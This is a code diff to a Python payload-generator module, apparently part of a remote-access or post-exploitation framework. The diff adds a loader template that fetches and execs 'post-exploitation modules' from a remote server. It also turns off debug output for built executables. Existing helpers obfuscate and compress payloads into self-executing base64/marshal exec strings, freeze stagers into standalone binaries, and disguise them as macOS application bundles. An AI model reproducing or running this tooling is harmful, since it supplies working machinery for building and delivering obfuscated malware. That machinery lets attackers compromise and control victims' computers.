@@ -5,9 +5,7 @@
 # standard library
 import os
 import sys
-import imp
 import zlib
-import time
 import base64
 import random
 import marshal
@@ -16,13 +14,30 @@ import subprocess
 
 # modules
 import util
-import security
 
 # globals
 __Template_main  = """
 if __name__ == '__main__':
     _{0} = {1}({2})
     """
+
+__Template_load = """
+# remotely import dependencies from server
+
+packages = {0}
+
+for package in packages:
+    try:
+        exec("import %s" % package, globals())
+        packages.remove(package)
+    except: pass
+
+with remote_repo(packages, base_url={1}):
+    for package in packages:
+        try:
+            exec("import %s" % package, globals())
+        except: pass
+"""
 
 __Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -81,7 +96,7 @@ exe = EXE(pyz,
           a.zipfiles,
           a.datas,
           name={name},
-          debug=True,
+          debug=False,
           strip=False,
           upx=False,
           runtime_tmpdir=None,
@@ -90,7 +105,7 @@ exe = EXE(pyz,
 
 # main
 def compress(input):
-    """ 
+    """
     Zip-compress output into self-executing script
 
     `Requires`
@@ -102,7 +117,7 @@ def compress(input):
     return "import zlib,base64,marshal;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))
 
 def obfuscate(input):
-    """ 
+    """
     Obfuscate and minimize memory footprint of output
 
     `Requires`
@@ -124,19 +139,19 @@ def obfuscate(input):
     return output
 
 def variable(length=6):
-    """ 
+    """
     Generate a random alphanumeric variable name of given length
 
     `Optional`
     :param int length:    length of the variable name to generate
 
     Returns variable as a string
-    
+
     """
     return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
 
 def main(function, *args, **kwargs):
-    """ 
+    """
     Generate a simple code snippet to initialize a script
 
     if __name__ == "__main__":
@@ -150,13 +165,29 @@ def main(function, *args, **kwargs):
     :param dict kwargs:     keyword arguments
 
     Returns code snippet as a string
-    
+
     """
     options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
     return __Template_main.format(function.lower(), function, options)
 
+def loader(host='127.0.0.1', port=1337, packages=[]):
+    """
+    Generate loader code which remotely imports the
+    payload dependencies and post-exploitation modules
+
+    `Required`
+    :param str host:        server IP address
+    :param int port:        server port number
+
+    `Optional`
+    :param list imports:    package/modules to remotely import
+
+    """
+    base_url = 'http://{}:{}'.format(host, port)
+    return __Template_load.format(repr(packages), repr(base_url))
+
 def freeze(filename, icon=None, hidden=None):
-    """ 
+    """
     Compile a Python file into a standalone executable
     binary with a built-in Python interpreter
 
@@ -165,7 +196,7 @@ def freeze(filename, icon=None, hidden=None):
     :param str filename:    target filename
 
     Returns output filename as a string
-    
+
     """
     basename = os.path.basename(filename)
     name = os.path.splitext(basename)[0]
@@ -183,7 +214,7 @@ def freeze(filename, icon=None, hidden=None):
         imports.extend(hidden)
     spec = __Template_spec.format(key=repr(key), basename=repr(basename), path=repr(path), imports=imports, name=repr(name), icon=repr(icon))
     fspec = os.path.join(path, name + '.spec')
-    with file(fspec, 'w') as fp:
+    with open(fspec, 'w') as fp:
         fp.write(spec)
     process = subprocess.Popen('{} -m PyInstaller {}'.format(sys.executable, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     while True:
@@ -196,7 +227,7 @@ def freeze(filename, icon=None, hidden=None):
     return output
 
 def app(filename, icon=None):
-    """ 
+    """
     Bundle the Python stager file into a Mac OS X application
 
     `Required`
@@ -221,10 +252,9 @@ def app(filename, icon=None):
     infoPlist = __Template_plist.format(baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
     os.makedirs(distPath)
     os.mkdir(rsrcPath)
-    with file(pkgPath, "w") as fp:
+    with open(pkgPath, "w") as fp:
         fp.write("APPL????")
-    with file(plistPath, "w") as fw:
+    with open(plistPath, "w") as fw:
         fw.write(infoPlist)
     os.rename(filename, os.path.join(distPath, baseName))
     return appPath
-
